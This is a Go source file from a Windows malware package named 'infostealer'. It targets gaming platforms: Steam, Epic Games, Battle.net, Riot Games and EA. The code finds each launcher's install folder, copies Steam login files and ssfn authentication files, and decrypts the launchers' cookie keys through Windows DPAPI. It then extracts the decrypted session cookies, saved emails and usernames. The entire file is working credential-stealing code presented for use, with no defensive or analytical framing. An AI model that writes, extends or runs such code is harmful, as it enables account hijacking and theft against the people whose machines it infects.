//go:build windows

package infostealer

import (
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"os"
	"path/filepath"
	"unsafe"

	"github.com/andygrunwald/vdf"
	"golang.org/x/sys/windows"
	"gopkg.in/yaml.v3"
	_ "modernc.org/sqlite"
)

var supportedGamingPlatforms = []struct {
	Name string
	Path string
}{
	{"Steam", filepath.Join(os.Getenv("ProgramFiles(x86)"), "Steam")},
	{"Epic Games", filepath.Join(os.Getenv("LOCALAPPDATA"), "EpicGamesLauncher", "Saved")},
	{"Battle.net", filepath.Join(os.Getenv("APPDATA"), "Battle.net")},
	{"Riot Games", filepath.Join(os.Getenv("LOCALAPPDATA"), "Riot Games", "Riot Client", "Data")},
	{"EA", filepath.Join(os.Getenv("LOCALAPPDATA"), "Electronic Arts", "EA Desktop", "CEF")},
}

func stealGamingCookies(dbpath string, key []byte) []cookie {
	file, err := os.ReadFile(dbpath)
	if err != nil {
		return nil
	}

	filename := filepath.Join(os.TempDir(), randomstring(10))
	err = os.WriteFile(filename, file, 0600)
	if err != nil {
		return nil
	}

	db, err := sql.Open("sqlite", "file:"+filename+"?mode=ro")
	if err != nil {
		return nil
	}
	defer db.Close()

	rows, err := db.Query("SELECT host_key, name, encrypted_value FROM cookies")
	if err != nil {
		return nil
	}
	defer rows.Close()

	var cookies []cookie
	for rows.Next() {
		var (
			domain         string
			name           string
			encryptedvalue []byte
		)
		err = rows.Scan(&domain, &name, &encryptedvalue)
		if err != nil {
			continue
		}

		plaintext, err := decrypt(encryptedvalue[3:], key)
		if err != nil {
			continue
		}

		cookies = append(cookies, cookie{
			Domain: domain,
			Name:   name,
			Value:  plaintext,
		})
	}
	os.Remove(filename)
	return cookies
}

type steamuser struct {
	UserID      string
	AccountName string
	DisplayName string
	SSFNCheck   string
}

type SSFNFile struct {
	File     []byte
	Filename string
}

type steam struct {
	Users   []steamuser
	SSFNs   []SSFNFile
	FullVDF []byte
}

type epic struct {
	Cookies []cookie
	Key     []byte
}

type battlenetJson struct {
	Client struct {
		Email     string `json:"SavedAccountEmail"`
		Region    string `json:"LastLoginRegion"`
		AutoLogin string `json:"AutoLogin"`
	} `json:"Client"`
}

type battlenet struct {
	Cookies    []cookie
	Key        []byte
	ClientInfo battlenetJson
}

type riotYaml struct {
	Install struct {
		Globals struct {
			Region string `yaml:"region"`
		} `yaml:"globals"`

		OsCrypt struct {
			EncryptedKey string `yaml:"encrypted_key"`
		} `yaml:"os_crypt"`

		Login struct {
			Username string `yaml:"username"`
		} `yaml:"riot-login"`
	} `yaml:"install"`
}

type riot struct {
	Cookies []cookie
	Data    riotYaml
	Key     []byte
}

type ea struct {
	Cookies    []cookie
	LocalState localState
	Key        []byte
}

type gamingPlatform struct {
	Name          string
	Localpath     string
	SteamData     steam
	EpicData      epic
	BattleNetData battlenet
	RiotData      riot
	EAData        ea
}

func (platform *gamingPlatform) getSteam() {
	vdfPath := filepath.Join(platform.Localpath, "config", "loginusers.vdf")
	f, err := os.Open(vdfPath)
	if err == nil {
		platform.SteamData.FullVDF, err = os.ReadFile(vdfPath)
		parser := vdf.NewParser(f)
		vdfFile, err := parser.Parse()
		if err != nil {
		} else {
			if userdata, ok := vdfFile["users"].(map[string]interface{}); ok {
				for id, data := range userdata {
					if info, ok := data.(map[string]interface{}); ok {
						user := steamuser{
							UserID:      id,
							AccountName: info["AccountName"].(string),
							DisplayName: info["PersonaName"].(string),
							SSFNCheck:   info["RememberPassword"].(string),
						}
						platform.SteamData.Users = append(platform.SteamData.Users, user)
					}
				}
			}
		}
		f.Close()
	}

	files, err := os.ReadDir(platform.Localpath)
	if err != nil {
		return
	}
	for _, file := range files {
		name := file.Name()
		if !file.IsDir() && len(name) > 4 && name[:4] == "ssfn" {
			ssfnPath := filepath.Join(platform.Localpath, name)
			ssfn, err := os.ReadFile(ssfnPath)
			if err != nil {
				continue
			}
			platform.SteamData.SSFNs = append(platform.SteamData.SSFNs, SSFNFile{
				File:     ssfn,
				Filename: name,
			})
		}
	}
}

func (platform *gamingPlatform) getEpic() {
	files, err := os.ReadDir(platform.Localpath)
	if err != nil {
		return
	}
	var localstatepath string
	for _, file := range files {
		if file.IsDir() && len(file.Name()) > 8 && file.Name()[:8] == "webcache" {
			localstatepath = filepath.Join(platform.Localpath, file.Name(), "Local State")
			break
		}
	}
	statefile, err := os.ReadFile(localstatepath)
	if err != nil {
		return
	}
	var state localState
	err = json.Unmarshal(statefile, &state)
	if err != nil {
		return
	}
	decoded, err := base64.StdEncoding.DecodeString(state.OsCrypt.EncryptedKey)
	if err != nil {
		return
	}

	newkey := decoded[5:]
	var in = blob{cbData: uint32(len(newkey)), pbData: &newkey[0]}
	var out blob
	err = windows.CryptUnprotectData((*windows.DataBlob)(unsafe.Pointer(&in)), nil, nil, 0, nil, 0, (*windows.DataBlob)(unsafe.Pointer(&out)))
	if err != nil {
		return
	}
	decrypted := unsafe.Slice(out.pbData, out.cbData)
	key := make([]byte, len(decrypted))
	copy(key, decrypted)
	platform.EpicData.Key = key

	platform.EpicData.Cookies = stealGamingCookies(filepath.Join(platform.Localpath, "Session Storage", "Cookies"), key)
}

func (platform *gamingPlatform) getBattlenet() {
	file, err := os.ReadFile(filepath.Join(platform.Localpath, "Local State"))
	if err != nil {
		return
	}
	var state localState
	err = json.Unmarshal(file, &state)
	decoded, err := base64.StdEncoding.DecodeString(state.OsCrypt.EncryptedKey)

	newkey := decoded[5:]
	var in = blob{cbData: uint32(len(newkey)), pbData: &newkey[0]}
	var out blob
	err = windows.CryptUnprotectData((*windows.DataBlob)(unsafe.Pointer(&in)), nil, nil, 0, nil, 0, (*windows.DataBlob)(unsafe.Pointer(&out)))
	if err != nil {
		return
	}
	decrypted := unsafe.Slice(out.pbData, out.cbData)
	key := make([]byte, len(decrypted))
	copy(key, decrypted)
	platform.BattleNetData.Key = key

	platform.BattleNetData.Cookies = stealGamingCookies(filepath.Join(platform.Localpath, "Session Storage", "Cookies"), key)

	configPath := filepath.Join(platform.Localpath, "Battle.net.config")
	config, err := os.ReadFile(configPath)
	if err == nil {
		var configjson battlenetJson
		err = json.Unmarshal(config, &configjson)
		platform.BattleNetData.ClientInfo = configjson
	}
}

func (platform *gamingPlatform) getRiot() {
	yamlPath := filepath.Join(platform.Localpath, "RiotClientPrivateSettings.yaml")
	file, err := os.ReadFile(yamlPath)
	if err != nil {
		return
	}
	err = yaml.Unmarshal(file, &platform.RiotData.Data)
	if err != nil {
		return
	}
	decoded, err := base64.StdEncoding.DecodeString(platform.RiotData.Data.Install.OsCrypt.EncryptedKey)
	if err != nil {
		return
	}

	newkey := decoded[5:]
	var in = blob{cbData: uint32(len(newkey)), pbData: &newkey[0]}
	var out blob
	err = windows.CryptUnprotectData((*windows.DataBlob)(unsafe.Pointer(&in)), nil, nil, 0, nil, 0, (*windows.DataBlob)(unsafe.Pointer(&out)))
	if err != nil {
		return
	}
	decrypted := unsafe.Slice(out.pbData, out.cbData)
	key := make([]byte, len(decrypted))
	copy(key, decrypted)
	platform.RiotData.Key = key

	platform.RiotData.Cookies = stealGamingCookies(filepath.Join(platform.Localpath, "Session Storage", "Cookies"), key)
}

func (platform *gamingPlatform) getEA() {
	prefPath := filepath.Join(platform.Localpath, "LocalPrefs.json")
	file, err := os.ReadFile(prefPath)
	if err != nil {
		return
	}
	err = json.Unmarshal(file, &platform.EAData.LocalState)
	if err != nil {
		return
	}
	platform.EAData.Key = platform.EAData.LocalState.decryptKey("", "", "v10")
	platform.EAData.Cookies = stealGamingCookies(filepath.Join(platform.Localpath, "BrowserCache", "EADesktop", "Network", "Cookies"), platform.EAData.Key)
}

type GamingPlatforms []gamingPlatform

func (platforms *GamingPlatforms) populate() {
	for i, platform := range *platforms {
		switch platform.Name {
		case "Steam":
			(*platforms)[i].getSteam()
		case "Epic Games":
			(*platforms)[i].getEpic()
		case "Battle.net":
			(*platforms)[i].getBattlenet()
		case "Riot Games":
			(*platforms)[i].getRiot()
		case "EA":
			(*platforms)[i].getEA()
		}
	}
}

func detectGamingPlatforms() GamingPlatforms {
	var platforms GamingPlatforms
	for _, platform := range supportedGamingPlatforms {
		dir, err := os.Stat(platform.Path)
		if err != nil {
			continue
		}
		if dir.IsDir() {
			platforms = append(platforms, gamingPlatform{
				Name:      platform.Name,
				Localpath: platform.Path,
			})
		}
	}
	return platforms
}

func Gaming() GamingPlatforms {
	platforms := detectGamingPlatforms()
	platforms.populate()
	return platforms
}
